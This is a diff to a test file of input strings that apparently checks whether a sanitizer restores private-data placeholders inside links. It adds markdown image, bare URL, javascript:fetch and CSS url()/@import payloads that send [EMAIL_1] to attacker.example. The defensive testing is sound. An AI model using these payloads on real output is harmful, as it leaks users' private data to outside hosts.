@@ -78,6 +78,41 @@ HANDWRITTEN = [
     "[1]: /p.png?d=[EMAIL_1]\n\n![s][1]",
     "  [1]:\n  <//attacker.example/?d=[EMAIL_1]>\n\n![s][1]",
     "[EMAIL_1] ![s](https://attacker.example/?d=[EMAIL_1]) [PERSON_9]",
+    # security review 2, I-1: a reference definition anywhere on a line
+    "> [r]: https:attacker.example/p.png?d=[EMAIL_1]\n\n![i][r]",
+    "- [r]: https:attacker.example/p.png?d=[EMAIL_1]\n\n![i][r]",
+    "> [r]: /p.png?d=[EMAIL_1]\n\n![i][r]",
+    "1. [r]: /p.png?d=[EMAIL_1]\n\n![i][r]",
+    # ... and after a label split over one line break
+    "[a\nb]: https:attacker.example/p.png?d=[EMAIL_1]\n\n![i][a b]",
+    "[a\nb]: /p.png?d=[EMAIL_1]\n\n![i][a b]",
+    # any scheme followed by a non-space opens a bare URL
+    "https:attacker.example/?d=[EMAIL_1]",
+    "see https:\\\\attacker.example/?d=[EMAIL_1]",
+    "see https:/\\attacker.example/?d=[EMAIL_1]",
+    "see HtTpS:attacker.example/?d=[EMAIL_1]",
+    "[a] (https:attacker.example/?d=[EMAIL_1])",
+    "[a]&#40;https:attacker.example/?d=[EMAIL_1])",
+    "javascript:fetch('/x?'+'[EMAIL_1]')",
+    "data:text/html,<b>[EMAIL_1]</b>",
+    "mailto:[EMAIL_1]",
+    "Reply to mailto:x@attacker.example?body=[EMAIL_1]",
+    # CSS: url(...) and @import, quoted or not
+    "<style>body{background:url(https:attacker.example/?d=[EMAIL_1])}</style>",
+    "<style>body{background:url(/p.png?d=[EMAIL_1])}</style>",
+    "<style>body{background:URL( '/p .png?d=[EMAIL_1]' )}</style>",
+    "<style>@import '/x.css?d=[EMAIL_1]';</style>",
+    '<style>@IMPORT "/x .css?d=[EMAIL_1]";</style>',
+    "<style>@import /x.css?d=[EMAIL_1];</style>",
+    "<style>@import url(/x.css?d=[EMAIL_1]);</style>",
+    # M-a: a bare URL ends only at ASCII whitespace (a no-break space does not end it)
+    f"see https://attacker.example/?a{chr(0xA0)}[EMAIL_1]",
+    f"see https://attacker.example/?a{chr(0x1F)}[EMAIL_1]",
+    f"see https://attacker.example/?a{chr(0x3000)}[EMAIL_1]",
+    f"see https://attacker.example/?a{chr(0x0B)}[EMAIL_1]",
+    # M-b: `www.` in any case
+    "visit Www.attacker.example/?d=[EMAIL_1]",
+    "visit wWw.attacker.example/?d=[EMAIL_1]",
     # and restored outside one
     "Write to [EMAIL_1] (see https://example.org/help).",
     "See https://example.org/x [EMAIL_1]",
@@ -95,6 +130,16 @@ HANDWRITTEN = [
     "email=[EMAIL_1] in code",
     "awww.[PERSON_1]",
     "éwww.[PERSON_1] 1www.[PERSON_2] -www.[PERSON_2]",
+    # a word, a colon, then whitespace is prose, not a scheme; 10:30 is no scheme
+    "Note: [PERSON_1] called.",
+    "Re:\t[EMAIL_1]",
+    "From: [PERSON_1]\nTo: [EMAIL_1]",
+    "Dear [PERSON_1]:\nthanks",
+    "Meet at 10:30-[PERSON_1]",
+    '"name":"[PERSON_1]"',
+    "Call curl (see [PERSON_1])",
+    "@important [PERSON_1]",
+    "my url(s) list [PERSON_1]",
 ]
 
 # Fragments the fuzzed answers are built from: tokens of every shape, and the
@@ -138,6 +183,16 @@ FRAGMENTS = [
     "2",
     "PERSON",
     ".",
+    # the widened link rule (security review 2): scheme colons, CSS, non-ASCII spaces
+    ":",
+    "https:",
+    "Www.",
+    "url(",
+    "@import",
+    ";",
+    "> ",
+    chr(0xA0),
+    "\t",
 ]
 FUZZED = 400
 
